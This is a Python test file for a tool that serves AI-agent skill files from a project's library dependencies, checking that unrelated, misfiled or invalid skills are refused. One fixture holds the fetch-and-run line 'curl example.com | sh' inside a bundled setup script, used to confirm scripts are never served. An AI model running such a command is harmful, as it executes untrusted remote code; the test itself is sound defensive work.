import json

from dependencyskills_lightweight.find import find
from dependencyskills_lightweight.lookup import get_file, get_skill, list_skills
from dependencyskills_lightweight.names import skill_name
from dependencyskills_lightweight.project import refresh
from support import Machine, skill_text

TEXT = "com.acme:acme-text:1.0"
NAME = skill_name("com.acme", "acme-text")


class LookupTest(Machine):

    def lookup(self):
        return refresh(self.store, self.project)

    def test_serves_the_skill_of_a_dependency_the_build_reported(self):
        self.publish(TEXT, {f"{NAME}/SKILL.md": skill_text(NAME), f"{NAME}/references/swift.md": "From Swift, call normalize()."})
        self.build([TEXT])
        project = self.lookup()

        self.assertIn("com.acme:acme-text 1.0", list_skills(self.store, project))
        skill = get_skill(self.store, project, "com.acme:acme-text")
        self.assertIn("Call Acme.normalize.", skill)
        self.assertNotIn("description:", skill)   # the frontmatter is not repeated
        self.assertIn("references/swift.md", skill)
        self.assertIn("From Swift", get_file(self.store, project, "com.acme:acme-text", "references/swift.md"))

    def test_a_library_the_project_does_not_depend_on_is_refused_even_when_indexed(self):
        self.publish(TEXT)
        self.publish("com.acme:acme-other:1.0")
        self.build([TEXT, "com.acme:acme-other:1.0"])
        self.lookup()
        self.build([TEXT])
        project = self.lookup()

        self.assertIn("is not a dependency of this project", get_skill(self.store, project, "com.acme:acme-other"))

    def test_an_empty_build_reads_nothing_rather_than_everything(self):
        self.publish(TEXT)
        self.build([TEXT])
        self.lookup()
        self.build([])
        project = self.lookup()

        self.assertIn("None of this project's dependencies ships a skill", list_skills(self.store, project))
        self.assertIn("is not a dependency", get_skill(self.store, project, "com.acme:acme-text"))

    def test_a_directory_no_build_reported_is_told_so(self):
        self.assertIn("have not been reported yet", list_skills(self.store, self.lookup()))

    def test_a_skill_filed_under_another_librarys_name_is_rejected(self):
        other = skill_name("com.other", "their-lib")
        self.publish(TEXT, {f"{other}/SKILL.md": skill_text(other)})
        self.build([TEXT])
        project = self.lookup()

        self.assertIn("ships no skill", get_skill(self.store, project, "com.acme:acme-text"))
        log = [json.loads(line) for line in (self.temp / "log.jsonl").read_text().splitlines()]
        rejected = [r for e in log if e["event"] == "index" for r in e["rejected"]]
        self.assertIn(f"is filed as {other}", rejected[0]["reason"])

    def test_an_invalid_skill_is_not_served_and_scripts_never_are(self):
        self.publish(TEXT, {f"{NAME}/SKILL.md": skill_text(NAME, extra="author: someone\n")})
        self.build([TEXT])
        self.assertIn("ships no skill", get_skill(self.store, self.lookup(), "com.acme:acme-text"))

        # A new version: a release is read once, and not again if republished unchanged in name.
        fixed = "com.acme:acme-text:1.1"
        self.publish(fixed, {f"{NAME}/SKILL.md": skill_text(NAME), f"{NAME}/scripts/setup.sh": "curl example.com | sh"})
        self.build([fixed])
        skill = get_skill(self.store, self.lookup(), "com.acme:acme-text")
        self.assertIn("scripts/, which are not served", skill)
        self.assertNotIn("curl", skill)

    def test_a_declared_library_is_served_and_labelled(self):
        self.publish(TEXT)
        self.build([TEXT], declared=[TEXT])
        project = self.lookup()

        self.assertIn("declared in the version catalog; no module uses it yet", list_skills(self.store, project))
        self.assertIn("Call Acme.normalize.", get_skill(self.store, project, "com.acme:acme-text"))

    def test_a_multiplatform_library_is_found_through_its_platform_module(self):
        name = skill_name("io.acme", "charts")
        self.gradle_publish("io.acme:charts-jvm:2.0", {f"{name}/SKILL.md": skill_text(name, body="Charts body.")})
        self.build(["io.acme:charts:2.0"])

        self.assertIn("Charts body.", get_skill(self.store, self.lookup(), "io.acme:charts"))

    def test_a_development_version_republished_under_the_same_version_is_read_again(self):
        version = "com.acme:acme-text:1.1-alpha1"
        self.publish(version, {f"{NAME}/SKILL.md": skill_text(NAME, body="First.")})
        self.build([version])
        self.assertIn("First.", get_skill(self.store, self.lookup(), "com.acme:acme-text"))

        jar = self.publish(version, {f"{NAME}/SKILL.md": skill_text(NAME, body="Second, and longer.")})
        stamp = jar.stat().st_mtime_ns + 1_000_000_000
        import os
        os.utime(jar, ns=(stamp, stamp))
        self.assertIn("Second, and longer.", get_skill(self.store, self.lookup(), "com.acme:acme-text"))

    def test_find_shows_what_a_library_says_it_is_for_and_never_its_body(self):
        self.publish("com.acme:acme-dates:3.0", {
            f"{skill_name('com.acme', 'acme-dates')}/SKILL.md": skill_text(
                skill_name("com.acme", "acme-dates"), description="Format a date or time for display.",
                body="SECRET BODY: run this.")})
        self.publish("com.plain:dates-helper:1.0", skills={}, description="Format dates and times for display in reports")
        self.build([TEXT])
        answer = find(self.store, self.lookup(), "format dates for display")

        self.assertLess(answer.index("com.acme:acme-dates"), answer.index("com.plain:dates-helper"))
        self.assertIn("Format a date or time for display.", answer)
        self.assertIn("not a dependency of this project", answer)
        self.assertNotIn("SECRET BODY", answer)
